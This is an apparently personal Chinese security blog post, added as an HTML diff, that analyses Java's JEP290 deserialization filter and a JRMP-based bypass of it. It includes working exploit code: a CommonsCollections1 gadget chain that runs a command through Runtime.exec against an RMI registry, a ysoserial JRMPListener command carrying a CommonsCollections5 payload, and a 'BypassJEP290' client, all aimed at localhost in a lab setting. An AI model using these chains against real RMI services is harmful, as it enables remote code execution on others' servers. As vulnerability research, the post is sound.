@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hai0unu11.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事： 1、提供一个限制反序列化类的机制，使用白名单或者黑名单。2、限制反序列化的深度和复杂度。3、为 RMI 远程调用对象提供了一个验证类的机制。4、定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。 官方从 8u121，7u13，6u141 分别支持了这个 JEP 0x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JEP290调试分析">
+<meta property="og:url" content="https://hai0unu11.github.io/2026/08/07/JEP290%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Hai0uBlog">
+<meta property="og:description" content="JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事： 1、提供一个限制反序列化类的机制，使用白名单或者黑名单。2、限制反序列化的深度和复杂度。3、为 RMI 远程调用对象提供了一个验证类的机制。4、定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。 官方从 8u121，7u13，6u141 分别支持了这个 JEP 0x">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260113212846532.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260113212905343.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260114172318968.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260114173501290.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260114172814273.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260114175514664.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260114223229202.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260114223346905.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260114223440275.png">
+<meta property="article:published_time" content="2026-08-07T08:56:39.000Z">
+<meta property="article:modified_time" content="2026-08-10T02:38:14.536Z">
+<meta property="article:author" content="Hai0u">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hai0unu11.github.io/images/image-20260113212846532.png">
+
+
+<link rel="canonical" href="https://hai0unu11.github.io/2026/08/07/JEP290%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hai0unu11.github.io/2026/08/07/JEP290%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/","path":"2026/08/07/JEP290调试分析/","title":"JEP290调试分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>JEP290调试分析 | Hai0uBlog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hai0uBlog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">好好学习，天天向上！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-JEP290-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">0x01 JEP290 防御手段分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">服务端：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">客户端：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%EF%BC%9A"><span class="nav-number">1.3.</span> <span class="nav-text">动态调试：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-JEP290-%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">0x02 JEP290 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="nav-number">2.2.</span> <span class="nav-text">动态调试</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Hai0u</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hai0unu11.github.io/2026/08/07/JEP290%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Hai0u">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hai0uBlog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="JEP290调试分析 | Hai0uBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JEP290调试分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-07 16:56:39" itemprop="dateCreated datePublished" datetime="2026-08-07T16:56:39+08:00">2026-08-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-08-10 10:38:14" itemprop="dateModified" datetime="2026-08-10T10:38:14+08:00">2026-08-10</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事：</p>
+<p>1、提供一个限制反序列化类的机制，使用白名单或者黑名单。<br>2、限制反序列化的深度和复杂度。<br>3、为 RMI 远程调用对象提供了一个验证类的机制。<br>4、定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。</p>
+<p>官方从 8u121，7u13，6u141 分别支持了这个 JEP</p>
+<h1 id="0x01-JEP290-防御手段分析"><a href="#0x01-JEP290-防御手段分析" class="headerlink" title="0x01 JEP290 防御手段分析"></a>0x01 JEP290 防御手段分析</h1><p><strong>使用的是8u121</strong></p>
+<h2 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class AttackRegistryEXP &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) CC1();</span><br><span class="line">        Remote remote = Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),new Class[] &#123; Remote.class &#125;, handler));</span><br><span class="line">        registry.rebind(&quot;test&quot;,remote);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object CC1() throws Exception&#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;</span><br><span class="line">                        , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(&quot;value&quot;,&quot;drunkbaby&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(true);</span><br><span class="line">        Object o = aihConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        return o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class EvilClassServer &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        User liming = new com.ldapserver.ServerReturnObject(&quot;liming&quot;,15);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        registry.bind(&quot;user&quot;,liming);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;registry is running...&quot;);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;liming is bind in registry&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20260113212846532.png" alt="image-20260113212846532"></p>
+<p>通过描述来看对应增加的 Filter 点是什么，找到了 ObjectInputFilter 相关的类</p>
+<p><img src="/images/image-20260113212905343.png" alt="image-20260113212905343"></p>
+<h2 id="动态调试："><a href="#动态调试：" class="headerlink" title="动态调试："></a>动态调试：</h2><p>先动态调试服务端，在启动客户端，在客户端这里打断点java.io.ObjectInputStream#filterCheck</p>
+<p>​	<img src="/images/image-20260114172318968.png" alt="image-20260114172318968"></p>
+<p>而 filterCheck() 方法又调用了 checkInput() 方法，这里应该是最终来判断输入是否合法的地方。直接跟进</p>
+<p><img src="/images/image-20260114173501290.png" alt="image-20260114173501290"></p>
+<p>然后跟进到这里，当传入的类不属于白名单的内容时，过滤器就会返回 <code>Status.REJECTED</code>，反序列化过程会立即中止，并抛出异常</p>
+<p><img src="/images/image-20260114172814273.png" alt="image-20260114172814273"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Number</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Remote</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Proxy</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">UnicastRef</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">RMIClientSocketFactory</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">RMIServerSocketFactory</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">ActivationID</span>.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">UID</span>.class</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-JEP290-绕过"><a href="#0x02-JEP290-绕过" class="headerlink" title="0x02 JEP290 绕过"></a>0x02 JEP290 绕过</h1><p> JRMP 的这一步，能够绕过，伪造了一个 UnicastRef (封装了与远程对象通信所需的全部信息和方法)用于跟注册中心通信</p>
+<p>早期的JEP290防护主要针对的是<strong>RMI注册表本身</strong>这个入口。但当注册表作为客户端与JRMP服务端建立连接后，后续的通信（特别是<strong>DGC - 分布式垃圾回收</strong>环节）在JDK 8u231之前的版本中，反序列化过滤器的设置存在漏洞或未被完全覆盖，因此，恶意JRMP服务端在DGC交互过程中，向注册表（此时它是客户端）发送封装了<code>CommonsCollections5</code>链的序列化数据时，这次反序列化操作<strong>不再受到严格的白名单限制</strong>，从而成功触发命令执行</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>先用 ysoserial 开启 JRMP 3333 端口的监听</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener <span class="number">3333</span> CommonsCollections5 &quot;Calc&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后编写 RMI 的 EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BypassJEP290</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">reg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>); <span class="comment">// rmi start at 2222</span></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">3333</span>); <span class="comment">// JRMPListener&#x27;s port is 3333</span></span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(BypassJEP290.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        reg.bind(<span class="string">&quot;Hello&quot;</span>,proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>在reg.bind(“Hello”,proxy);断点进入，当我们调用 <code>bind</code> 方法后，会通过 <code>UnicastRef</code> 对象中存储的信息与注册中心进行通信</p>
+<p><img src="/images/image-20260114175514664.png" alt="image-20260114175514664"></p>
+<p>这里会通过 ref 与注册中心通信，并将绑定的对象名称以及要绑定的远程对象发过去，注册中心在后续会对应进行反序列化</p>
+<p>接着来看看 yso 中的 JRMPClient 是做了什么操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ObjID id = new ObjID(new Random().nextInt()); // RMI registry</span><br><span class="line">TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span><br><span class="line">Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;</span><br><span class="line">    Registry.class</span><br><span class="line">&#125;, obj);</span><br><span class="line">return proxy;</span><br></pre></td></tr></table></figure>
+
+<p>这里返回了一个代理对象，上面用的这些类都在白名单里，当注册中心反序列化时，会调用到<code>RemoteObjectInvacationHandler</code>父类<code>RemoteObject</code>的<code>readObject</code>方法（因为<code>RemoteObjectInvacationHandler</code>没有<code>readObject</code>方法），在<code>readObject</code>里的最后一行会调用<code>ref.readExternal</code>方法，并将<code>ObjectInputStream</code>传进去：</p>
+<p>这里的调用栈非常长，总体上来说就是在做我上面所说的工作，调用栈如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">readObject:455, RemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2178, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:2287, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:2211, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)     // 从此处开始，会遇到很多字节码不匹配的问题</span><br><span class="line">dispatch:92, RegistryImpl_Skel (sun.rmi.registry)</span><br><span class="line">oldDispatch:469, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:301, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:200, Transport$1 (sun.rmi.transport)</span><br><span class="line">run:197, Transport$1 (sun.rmi.transport)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">serviceCall:196, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:573, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-1, 1330984495 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+
+<p>一路跟进到 <code>sun.rmi.transport.LiveRef#read</code></p>
+<p><img src="/images/image-20260114223229202.png" alt="image-20260114223229202"></p>
+<p>可以看到这里把 payload 里所传入的 <code>LiveRef</code> 解析到 <code>var5</code> 变量处，里面包含了 <code>ip</code> 与 <code>端口</code> 信息(JRMPListener 的端口)。这些信息将用于后面注册中心与 JRMP 端建立通信。</p>
+<p><img src="/images/image-20260114223346905.png" alt="image-20260114223346905"></p>
+<p>跟进 <code>saveRef()</code> 方法，里面做了一个映射，其建立了一个 <code>TCPEndpoint</code> 到 <code>ArrayList&lt;LiveRef&gt;</code> 的映射关系。</p>
+<p><img src="/images/image-20260114223440275.png" alt="image-20260114223440275"></p>
